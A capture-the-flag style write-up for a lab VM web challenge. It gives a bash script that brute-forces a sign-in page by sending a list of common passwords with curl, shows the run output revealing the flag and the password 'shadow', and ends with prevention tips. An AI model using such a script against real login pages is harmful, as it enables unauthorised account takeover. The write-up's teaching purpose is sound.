# Frist Step

After launching your vm and setting it up, u should visit the http://10.12.180.85:80, it's normal to try sign in, but u don't have even the username or the password, now the idea here is brute force attack on the web application to discover a valid password.

# How to do that

I choose one of the most common username in the internet "shadow" and try to log with and testing some of the common passwords too like 
```
1234 baseball iloveyou trustno1 sunshine princess football welcome shadow superman michael ninja
```
the script is:

```bash
#!/bin/bash

passwords=(123456 password 123456789 12345678 12345 1234567 admin 123123 qwerty abc123 letmein monkey 111111 password1 qwerty123 dragon 1234 baseball iloveyou trustno1 sunshine princess football welcome shadow superman michael ninja mustang jessica charlie ashley bailey passw0rd master love hello freedom whatever nicole jordan cameron secret summer 1q2w3e4r zxcvbnm starwars computer taylor startrek)

for password in "${passwords[@]}"
do
    echo "Trying password: $password"
    
    curl -X GET "http://10.12.180.85/?page=signin&username=shadow&password=$password&Login=Login#" | grep flag
done
```
after run it the result looks like that:

```bash
~ bash test.sh
Trying password: 123456
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1988    0  1988    0     0    993      0 --:--:--  0:00:02 --:--:--   993
Trying password: passwod
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1988    0  1988    0     0    991      0 --:--:--  0:00:02 --:--:--   992
Trying password: 3456
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1988    0  1988    0     0    992      0 --:--:--  0:00:02 --:--:--   993
Trying password: welcome
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1988    0  1988    0     0    993      0 --:--:--  0:00:02 --:--:--   993
Trying password: shadow
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2084    0  2084    0     0  1529k      0 --:--:-- --:--:-- --:--:-- 2035k
<center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>

Trying password: football
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1988    0  1988    0     0    992      0 --:--:--  0:00:02 --:--:--   993
```

And here as u noticed the right password that give you the flag is:
```
shadow
```
so the username is "shadow" and password is also "shadow"


##  Prevention


Avoid the use of leaked usernames and passwords or that includes related data to you or your website

Use of Captcha

Limit the number of attempts to login 

Block login attempts coming from certain IPs

Use strong password policies